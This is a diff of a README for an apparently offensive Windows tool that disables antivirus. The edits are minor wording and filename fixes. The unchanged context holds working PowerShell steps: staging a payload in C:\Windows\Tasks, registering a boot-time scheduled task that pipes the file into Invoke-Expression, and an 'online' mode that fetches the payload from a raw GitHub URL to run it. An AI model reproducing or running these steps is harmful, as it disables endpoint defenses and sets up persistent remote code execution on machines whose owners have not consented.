@@ -12,7 +12,7 @@ Global connection NOT RECOMMENDED! ❌
 # AV Disabler [disAVler.txt]
 ## Offline
 ### Prepare the disablers [having DisAVler.txt on the host]:
-Download the `disAVle.txt` file from repository into `C:\Windows\Tasks\`.
+Download the `disAVler.txt` file from repository into `C:\Windows\Tasks\`.
 
 Or Execute this sh1t with PS [offline]:
 ```
@@ -61,7 +61,7 @@ echo 'Set-ItemProperty -Path $regPath -Name $propertyName -Value $desiredValue -
 ```
 
 ### Setup Task Scheduler
-Execute this sh1t with PS for offline:
+Execute with PS for offline mode:
 ```
 $Action = New-ScheduledTaskAction -Execute "powershell.exe" `
     -Argument '-Command "GET-Content -Raw C:\Windows\Tasks\DisAVler.txt | IEX"' `
@@ -81,7 +81,7 @@ Register-ScheduledTask -TaskName "DisAVlerOnBoot" -InputObject $Task
 
 
 ## Online
-Execute this sh1t with PS for online [having DisAVler.txt on another host]. 
+Execute with PS for online [having DisAVler.txt on another host]. 
 
 Change https://raw.githubusercontent.com/DRAGOWN/DisAVling/refs/heads/main/DisAVler-Out0.txt with your hosted file:
 ```
